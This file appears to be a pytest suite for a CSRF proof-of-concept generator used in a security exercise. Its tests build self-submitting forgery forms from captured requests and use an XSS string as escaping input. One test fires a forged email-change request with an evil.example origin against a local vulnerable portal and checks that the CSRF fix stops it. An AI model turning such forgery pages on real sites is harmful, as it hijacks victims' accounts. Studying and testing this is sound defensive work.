from html.parser import HTMLParser

import pytest
import requests
from sandpay_vuln import make_app, serve
from web.csrf_poc import build_poc, parse_captured

pytestmark = pytest.mark.exercise

FORM_POST = (
    "POST /settings/email HTTP/1.1\r\n"
    "Host: 127.0.0.1:8765\r\n"
    "Cookie: sid=victim-session\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "\r\n"
    "email=new%40shop-a.example")


class _Inputs(HTMLParser):
    """What a browser would submit from the PoC: the form's action, method, enctype and hidden fields."""

    def __init__(self):
        super().__init__()
        self.form, self.fields = {}, []

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self.form = a
        elif tag == "input":
            self.fields.append((a.get("name"), a.get("value")))


def read_poc(page):
    p = _Inputs()
    p.feed(page)
    return p.form, p.fields


def test_form_post_becomes_a_self_submitting_form():
    poc = build_poc(parse_captured(FORM_POST))
    assert poc.exploitable_by_form
    form, fields = read_poc(poc.html)
    assert form["action"] == "http://127.0.0.1:8765/settings/email"
    assert form["method"] == "POST" and "enctype" not in form
    assert fields == [("email", "new@shop-a.example")]
    assert ".submit()" in poc.html and form.get("id") == "poc"
    assert "victim-session" not in poc.html  # the browser adds the cookie; the PoC never contains it


def test_values_are_escaped():
    raw = FORM_POST.replace("email=new%40shop-a.example", "email=x%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E")
    poc = build_poc(parse_captured(raw))
    assert "<script>alert(1)" not in poc.html
    assert read_poc(poc.html)[1] == [("email", 'x"><script>alert(1)</script>')]


def test_get_request_uses_the_query_string():
    raw = "GET /settings/delete?confirm=yes&id=7 HTTP/1.1\r\nHost: portal.sandpay.example\r\n\r\n"
    poc = build_poc(parse_captured(raw, scheme="https"))
    form, fields = read_poc(poc.html)
    assert (form["action"], form["method"]) == ("https://portal.sandpay.example/settings/delete", "GET")
    assert fields == [("confirm", "yes"), ("id", "7")]


@pytest.mark.parametrize("raw, reason", [
    ("PATCH /api/profile HTTP/1.1\r\nHost: h\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nrole=admin",
     "method PATCH"),
    ('POST /api/notes HTTP/1.1\r\nHost: h\r\nContent-Type: application/json\r\n\r\n{"body":"x"}',
     "content type application/json"),
    ("POST /settings/email HTTP/1.1\r\nHost: h\r\nAuthorization: Bearer abc\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n\r\nemail=a%40b.example", "header Authorization"),
    ("POST /settings/email HTTP/1.1\r\nHost: h\r\nX-CSRF-Token: t\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n\r\nemail=a%40b.example", "header X-CSRF-Token"),
])
def test_requests_a_form_cannot_forge(raw, reason):
    poc = build_poc(parse_captured(raw))
    assert not poc.exploitable_by_form and poc.html == ""
    assert any(n.startswith(reason) for n in poc.notes), poc.notes


def test_other_custom_header_only_adds_a_note():
    raw = FORM_POST.replace("Cookie:", "X-Request-Id: 42\r\nCookie:")
    poc = build_poc(parse_captured(raw))
    assert poc.exploitable_by_form and any(n.startswith("header X-Request-Id") for n in poc.notes)


def test_text_plain_trick_rebuilds_the_body():
    raw = 'POST /api/notes HTTP/1.1\r\nHost: h\r\nContent-Type: text/plain\r\n\r\n{"body":"hi","pad":"=x"}'
    poc = build_poc(parse_captured(raw))
    form, fields = read_poc(poc.html)
    assert form["enctype"] == "text/plain"
    name, value = fields[0]
    assert name + "=" + value == '{"body":"hi","pad":"=x"}'  # how a text/plain form sends name=value


def submit_like_a_browser(page, cookie):
    form, fields = read_poc(page)
    return requests.request(form["method"], form["action"], data=dict(fields), timeout=5,
                            headers={"Cookie": cookie, "Origin": "https://evil.example"}, allow_redirects=False)


@pytest.mark.parametrize("fixed, status, changed", [((), 200, True), (("csrf",), 403, False)])
def test_poc_works_only_against_the_vulnerable_portal(fixed, status, changed):
    with serve(make_app(fixed)) as base:
        r = requests.post(base + "/api/login", json={"email": "alice@shop-a.example", "password": "alice-pass-1"})
        cookie = r.headers["Set-Cookie"].split(";")[0]
        host = base.split("//", 1)[1]
        raw = FORM_POST.replace("127.0.0.1:8765", host).replace("new%40shop-a.example", "poc%40evil.example")
        poc = build_poc(parse_captured(raw))
        assert submit_like_a_browser(poc.html, cookie).status_code == status
        me = requests.get(base + "/api/me", headers={"Cookie": cookie}).json()
        assert (me["email"] == "poc@evil.example") is changed
